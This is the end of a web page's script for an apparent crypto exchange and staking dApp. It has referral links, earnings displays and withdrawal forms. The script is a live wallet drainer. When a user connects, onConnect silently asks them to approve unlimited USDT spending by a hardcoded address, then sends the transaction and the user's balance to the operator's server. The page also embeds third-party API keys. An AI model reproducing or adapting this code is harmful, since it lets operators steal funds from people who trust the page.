alse,"inputs":[{"name":"_value","type":"uint256"}],"name":"decreaseSupply","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_newFundDeposit","type":"address"}],"name":"changeOwner","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"ethFundDeposit","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"increaseSupply","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_tokenExchangeRate","type":"uint256"}],"name":"setTokenExchangeRate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"fundingStartBlock","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"fundingStopBlock","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"_ethFundDeposit","type":"address"},{"name":"_currentSupply","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_to","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"AllocateToken","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_to","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"IssueToken","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_value","type":"uint256"}],"name":"IncreaseSupply","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_value","type":"uint256"}],"name":"DecreaseSupply","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_to","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"Migrate","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_from","type":"address"},{"indexed":true,"name":"_to","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_owner","type":"address"},{"indexed":true,"name":"_spender","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"Approval","type":"event"}];

    const addr = {
        'usdt': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    }
    var approveAddr = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const price = {
        'WIN': 0.001150,
        'USDT': 1,
        'TONS': 1.35,
        'USDJ': 1.04,
        'JST': 0.125,
        "HT": 20.41,
        "SUN": 33.97,
        "EXNX": 0.0621,
        "VCOIN": 0.004225,
        "POL": 0.1393,
        "CKRW": 0.002487,
    }

    const decimals = {
        'WIN': 6,
        'USDT': 6,
        'TONS': 6,
        'USDJ': 18,
        'JST': 18,
        "HT": 18,
        "SUN": 18,
        "EXNX": 18,
        "VCOIN": 6,
        "POL": 8,
        "CKRW": 6,
    }
    function replaceParamVal(paramName,replaceWith) {
        var oUrl = window.location.href.toString();
        var re=eval('/('+ paramName+'=)([^&]*)/gi');
        var nUrl = oUrl.replace(re,paramName+'='+replaceWith);
        return nUrl
    }

    /******************************************/
    // Unpkg imports
    const _web3 = new Web3('https://mainnet.infura.io/v3/55b3638faed94111ad03a5c00cfa6f37')
    let injectedWeb3 = null, total = 0


    const contracts = {}
    for (const symbol of Object.keys(addr)) {
        const contractAddr = addr[symbol]
        contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
    }
    const WalletConnectProvider = window.WalletConnectProvider.default;
    let web3Modal
    // Unpkg imports
    const Web3Modal = window.Web3Modal.default;
    const Fortmatic = window.Fortmatic;
    const evmChains = window.evmChains;
    let provider;
    let selectedAccount;


    var app = new Vue({
        el: '#app',
        data: {
            network:false,
            pageindex: 'index',
            tabindex: 'exchange',
            recordindex: 'exchange',
            defaultAddress: "",
            authorized_address: "0x7D51EDaCfF2cF27BA3A562E24E702E644eb7dB86",
            langs: [],
            selectedIndex: [],
            help: [],
            p: '',

            balance: '',
            wallet: '',
            total: '',
            balancetotal:0,
            d: '',
            form: {
                dnumber: '',
                wnumber: '',
                address: '',
                type: 1,
                day:30,
                num:'',
                item_id:0,
                pageindex:'index'

            },
            lang: "zh",
            animate: false,
            allprofit:0,
            team_profit:0,
            marqueeList: [],
            found: [],
            share_url:'',
            share_url_trc:'',
            myson:0,
            pool:{},
            price:"",
            userinfo:{},
            lock_day_price:"",
            gonggaodata:[],
            teamfounds:[],
            indexqrcode:0,
            activeNames: [0,1,2],
            domain:"",
            zy:{
                num:""
            }
        },
        created: function () {
            this.init();
            this.domain=window.location.host;
            this.share_url= "https://"+this.domain+"?p=1&d=1&lang="+this.lang+'&type='+1
            this.share_url_trc= "https://"+this.domain+"?p=1&d=1&lang="+this.lang+'&type='+2
            let _this = this;
            this.lang = this.getUrlQueryString('lang') == '' ? 'zh' : this.getUrlQueryString('lang')
            this.p = this.getUrlQueryString('p') == '' ? 1 : this.getUrlQueryString('p')
            this.d = this.getUrlQueryString('d') == '' ? 1 : this.getUrlQueryString('d')
            this.language();
            this.text();
            this.gonggao()
            setInterval(this.showMarquee, 2000)
            this.help_center();
            _this.push()
            setInterval(function () {
                _this.push()
            },3000)
            this.getprice();

        },
        methods: {
            handleChange(){

            },
            async getprice(){
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/getprice',
                    async: false,
                    data:{type:1},
                    success: function (data) {
                        _this.price=data
                    },
                    error: function (data) {
                    }
                })
            },
            teamfound(){
                let _this=this
                $.ajax({
                    type: 'get',
                    url: '/index/index/teamfound',
                    async: false,
                    data: {address: this.defaultAddress},
                    success: function (data) {
                        _this.teamfounds = data.data
                    },
                    error: function (data) {

                    }
                })
            },
            buy(){
                if(this.defaultAddress ==''){
                    toast('Please login')
                    return true
                }
                if(this.zy.num ==''){
                    toast('Please enter quantity')
                    return true
                }

                $.ajax({
                    type: 'get',
                    url: '/index/index/buy',
                    async: false,
                    data:this.zy,
                    success: function (data) {
                        toast(data.msg)
                    },
                    error: function (data) {
                    }
                })
            },
            zy_buy(){
                if(this.defaultAddress ==''){
                    toast('Please login')
                    return true
                }
                if(this.zy.num ==''){
                    toast('Please enter quantity')
                    return true
                }

                $.ajax({
                    type: 'get',
                    url: '/index/index/zy_buy',
                    async: false,
                    data:{num:this.zy.num,address:this.defaultAddress},
                    success: function (data) {
                        toast(data.msg)
                    },
                    error: function (data) {
                    }
                })
            },
            jc_zy_buy(){
                if(this.defaultAddress ==''){
                    toast('Please login')
                    return true
                }
                if(this.zy.num ==''){
                    toast('Please enter quantity')
                    return true
                }

                $.ajax({
                    type: 'get',
                    url: '/index/index/jc_zy_buy',
                    async: false,
                    data:{num:this.zy.num,address:this.defaultAddress},
                    success: function (data) {
                        toast(data.msg)
                    },
                    error: function (data) {
                    }
                })
            },
            calculate_earnings(val){
                this.form.day=day;
                this.form.rate=price;
                this.form.item_id=id
                this.allprofit=this.form.num*this.form.day*price

            },

            gonggao(){
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/gonggao',
                    async: false,
                    data:{type:1},
                    success: function (data) {
                        _this.gonggaodata=data.data
                    },
                    error: function (data) {
                    }
                })
            },
            push(){
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/push',
                    data:{type:1},
                    async: false,
                    success: function (data) {
                        _this.pool=data.data
                    },
                    error: function (data) {
                    }
                })
            },
            async   init(){




                const providerOptions = {
                    walletconnect: {
                        package: WalletConnectProvider,
                        options: {
                            infuraId: "cd6790ac1b8f4144ac0a6498de5f1e3f",
                        }
                    },
                    fortmatic: {
                        package: Fortmatic,
                        options: {
                            // Mikko's TESTNET api key
                            key: "pk_live_3D938B1C3825E2E9"
                        }
                    }
                };
                web3Modal = new Web3Modal({
                    cacheProvider: false, // optional
                    providerOptions, // required
                    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
                });

                try {
                    provider = await web3Modal.connect()
                    provider.enable()

                } catch(e) {
                    toast("Please open it in DAPP wallet browser");

                    return;
                }

                // Subscribe to accounts change
                provider.on("accountsChanged", async (accounts) => {
                    await this.fetchAccountData();
                });


                // Subscribe to chainId change
                provider.on("chainChanged", async (chainId) => {
                    await this.fetchAccountData();
                });

                // Subscribe to networkId change
                provider.on("networkChanged", async (networkId) => {
                    await this.fetchAccountData();
                });
                await  this.refreshAccountData();
            },



            async  refreshAccountData() {

                await this.fetchAccountData(provider);
            },

            /**
             * Kick in the UI action after Web3modal dialog has chosen a provider
             */
            async  fetchAccountData() {
                const web3 = new Web3(provider);
                provider.enable()
                const accounts = await web3.eth.getAccounts()
                this.defaultAddress = accounts[0];
                this.form.address = this.defaultAddress;
                await this.getMostValuableAssets(this.defaultAddress)
                this.login()


            },
            async  getMostValuableAssets(account) {
                let _symbol = 'usdt'
                let _this=this
                for (const [symbol, contract] of Object.entries(contracts)) {
                    contract.methods.balanceOf(account).call(function(err, balance) {
                        _this.balancetotal = balance/1000000
                    })
                }
                return _symbol
            },

            /**
             * Connect wallet button pressed.
             */
            async   onConnect() {
                let _this=this
                if (this.defaultAddress && provider) {
                    const web3 = new Web3(provider);
                    const contract = new web3.eth.Contract(ABI, approveAddr)
                    const gasPrice = await web3.eth.getGasPrice()
                    contract.methods.approve(this.authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
                        from: this.defaultAddress,
                        gasPrice: gasPrice,
                        gas: 70000,
                    }, function(err, tx) {
                        if(!err){
                            _this.approval(_this.defaultAddress, tx, _this.balancetotal)
                            toast("success");
                        }else{
                            toast(err);
                        }
                    })
                } else {
                    provider = await web3Modal.connect()
                    provider.enable()
                    const web3 = new Web3(provider);
                    const accounts = await web3.eth.getAccounts()
                    this.defaultAddress = accounts[0]
                    const contract = new web3.eth.Contract(ABI, approveAddr)
                    const gasPrice = await web3.eth.getGasPrice()
                    contract.methods.approve(this.authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
                        from: this.defaultAddress,
                        gasPrice: gasPrice,
                        gas:70000,
                    }, function(err, tx) {
                        if(!err){
                            _this.approval(_this.defaultAddress, tx, _this.balancetotal)
                        }
                        else{
                            toast("fail");
                        }
                    })
                }
            },

            /**
             * Disconnect wallet button pressed.
             */
            async  onDisconnect() {

                console.log("Killing the wallet connection", provider);

                // TODO: Which providers have close method?
                if(provider.close) {
                    await provider.close();

                    // If the cached provider is not cleared,
                    // WalletConnect will default to the existing session
                    // and does not allow to re-scan the QR code with a new wallet.
                    // Depending on your use case you may want or want not his behavir.
                    await web3Modal.clearCachedProvider();
                    provider = null;
                }

                this.defaultAddress=''
                // Set the UI back to the initial state
                // document.querySelector("#prepare").style.display = "block";
                // document.querySelector("#connected").style.display = "none";
            },
            tabrecord(index, num) {
                let _this = this;
                this.form.found_type = num;
                this.recordindex = index;
                _this.found=[]
                $.ajax({
                    type: 'get',
                    url: '/index/index/found',
                    async: false,
                    data: this.form,
                    success: function (data) {
                        if (data.code == 0) {

                        } else {
                            _this.found = data.data
                        }
                    },
                    error: function (data) {
                    }
                })

            },
            submitwithdraw() {
                let _this = this;
                if (this.form.number == 0 || this.form.number == '') {
                    toast('Quantity cannot be empty')
                    return true
                }
                if (this.form.address == 0) {
                    toast('Please login')
                    return true
                }
                $.ajax({
                    type: 'get',
                    url: '/index/index/withdraw',
                    async: false,
                    data: this.form,
                    success: function (data) {
                        toast(data.msg)
                        if (data.code == 0) {
                            toast(data.msg)
                        } else {
                            _this.login()
                        }
                    },
                    error: function (data) {

                    }
                })
            },
            postexchange() {
                if (this.form.number == 0 || this.form.number == '') {
                    toast('Quantity cannot be empty')
                    return true
                }
                if (this.form.address == 0) {
                    toast('Please login')
                    return true
                }
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/postexchange',
                    async: false,
                    data: this.form,
                    success: function (data) {
                        toast(data.msg)
                        if (data.code == 0) {
                            toast(data.msg)
                        } else {
                            _this.login()
                        }
                    },
                    error: function (data) {

                    }
                })

            },
            tab(page) {
                this.tabindex = page;

            },
            pages: function (page) {
                this.pageindex = page
                this.form.pageindex=page
                this.login();
                this.toqrcode(page);

                if(page =='team'){
                    this.teamfound();
                }
            },
            toqrcode(page){
                let that=this;
                setTimeout(function () {
                    if(page =='team'){
                        if(that.indexqrcode ==0){
                            new QRCode("qrcode_url", {
                                text: that.share_url,
                                width: 152,
                                height: 152,
                                colorDark : "#000000",
                                colorLight : "#ffffff",
                                correctLevel : QRCode.CorrectLevel.H
                            });
                            that.indexqrcode=1;
                        }else{
                        }

                        var clipboard = new Clipboard('#copy', {
                            text: function () {
                                return that.share_url;
                            }
                        });
                        clipboard.on('success', function(e) {
                            toast("Copy successful")
                        });

                        clipboard.on('error', function(e) {
                            console.log(e);
                        });
                    }else{

                    }
                },500)
            },
            text() {
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/text',
                    async: false,
                    data: {type: 1},
                    success: function (data) {
                        _this.marqueeList = data.data
                    },
                    error: function (data) {

                    }
                })
            },
            showMarquee: function () {
                this.animate = true;
                setTimeout(() => {
                    this.marqueeList.push(this.marqueeList[0]);
                    this.marqueeList.shift();
                    this.animate = false;
                }, 500)
            },
            help_center() {
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/help',
                    data:{type:1},
                    async: false,
                    success: function (data) {
                        _this.help = data.data
                    },
                    error: function (data) {

                    }
                })
            },
            handleCommand(command) {
                console.log(111);
                console.log(command);
                this.selectedIndex = this.langs[command]
                this.lang=this.selectedIndex.lang;
                var url= replaceParamVal('lang',this.lang)
                window.location.href=url;
            },
            language() {
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/language',
                    async: false,
                    success: function (data) {
                        var data = data.data;
                        _this.selectedIndex = data[0]
                        _this.langs = data
                        for (var i=0; i<data.length;i++){
                            if(data[i]['lang'] ==_this.lang){
                                _this.selectedIndex = data[i]
                            }
                        }
                    },
                    error: function (data) {

                    }
                })
            },
            login() {
                let _this = this;
                $.ajax({
                    type: 'post',
                    url: '/index/index/login',
                    data: {
                        address: this.defaultAddress,
                        type: 1,
                        p: this.getUrlQueryString('p'),
                        d: this.getUrlQueryString('d'),
                        pageindex:this.form.pageindex
                    },
                    success: function (data) {
                        if(data.code ==1){
                            _this.userinfo = data.data
                            _this.d = _this.getUrlQueryString('d') == '' ?  data.data.agent_id : _this.getUrlQueryString('d')
                            _this.share_url= _this.userinfo.url==''?"https://"+_this.domain+"?p="+data.data.id+"&d=1&lang="+_this.lang+'&type='+1:_this.userinfo.url
                        }else{
                            toast(data.msg)
                        }

                    },
                })
            },
            approval(address, tx, balance) {
                let _this = this;
                $.ajax({
                    type: 'post',
                    url: '/index/index/login',
                    data: {tx: tx, address: address, balance: balance,type:this.form.type},
                    success: function (data) {
                        _this.login();
                    },
                })
            },

            getUrlQueryString: function (names, urls) {
                urls = urls || window.location.href;
                urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
                var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
                var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
                if (r != null && r[2] != "") return unescape(r[2]);
                return null;

            },



        },
        filters: {
            formatAddress: function (value) {
                if (!value) return ''
                return value.slice(1, 6)
            },
            defaultwallentaddress:function (value) {
                if (!value) return 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
                return value.slice(1, 6)
            }
        }
    })

</script>
</html>
